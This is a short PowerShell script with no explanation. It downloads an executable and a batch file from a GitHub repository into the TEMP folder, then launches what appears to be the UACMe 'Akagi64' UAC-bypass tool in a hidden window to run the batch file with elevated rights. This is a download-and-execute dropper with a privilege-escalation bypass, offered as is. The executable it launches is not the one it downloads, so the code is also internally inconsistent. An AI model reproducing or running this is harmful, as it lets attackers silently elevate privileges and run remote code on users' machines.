Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/uac.exe' -OutFile "$env:TEMP\uac.exe" -UseBasicParsing
Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/setup.cmd' -OutFile "$env:TEMP\setup.cmd" -UseBasicParsing

Start-Process "$env:TEMP\Akagi64.exe" -ArgumentList "85 `"C:\Windows\System32\cmd.exe /c $env:TEMP\setup.cmd`"" -WindowStyle Hidden
